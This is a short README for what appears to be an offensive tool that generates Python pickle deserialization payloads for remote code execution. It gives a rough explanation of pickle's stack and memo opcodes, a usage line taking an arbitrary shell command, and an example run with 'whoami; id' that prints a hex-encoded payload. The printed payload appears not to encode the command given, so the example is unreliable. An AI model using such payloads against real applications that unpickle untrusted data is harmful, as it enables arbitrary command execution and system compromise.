# Pickle RCE payload
[![Python3.x](https://img.shields.io/badge/python-3.x-FADA5E.svg?logo=python)](https://www.python.org/)

### Python's pickling deserialization Remote Code Execution payload generator.**

**Pickle** is a python package used to 'serialize' an object to string format and store them to Pickle is a simple stack language, which means pickle has a variable stack.
Every time it finished 'deserializing' an object it stores it on the stack.
Every time it reaches a '.' while 'deserializing', it pop a variable from the stack. Besides, pickle has a temperary memo, like a clipboard.
'p0', 'p1' means put the top obj on the stack to memo and refer it as '0' or '1'
'g0', 'g1' act as get obj '0' or '1'

### Usage:
```sh
$ python3 exploit.py [command]
```

**Example:**

```sh
$ python3 exploit.py 'whoami; id'
b'8004951a000000000000008c05706f736978948c0673797374656d9493944b0a859452942e'
```